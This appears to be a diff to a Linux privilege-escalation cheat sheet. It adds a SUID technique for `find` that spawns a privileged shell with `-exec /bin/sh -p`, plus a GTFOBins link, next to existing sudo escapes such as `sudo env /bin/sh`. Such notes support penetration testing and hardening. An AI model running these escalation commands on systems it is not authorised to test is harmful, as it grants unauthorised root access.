@@ -77,6 +77,16 @@ _**You Should Get the Root Shell On The Attacker Machine**_
 
 ## Find Command
 
+### SUID
+
+```
+sudo install -m =xs $(which find) .
+
+./find . -exec /bin/sh -p \; -quit
+```
+
+### SUDO
+
 ```
 sudo -l
 ```
@@ -339,3 +349,4 @@ sudo env /bin/sh
 * [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 * [https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/](https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/)
 * [https://gtfobins.github.io/gtfobins/env/#sudo](https://gtfobins.github.io/gtfobins/env/#sudo)
+* [https://gtfobins.github.io/gtfobins/find/#suid](https://gtfobins.github.io/gtfobins/find/#suid)
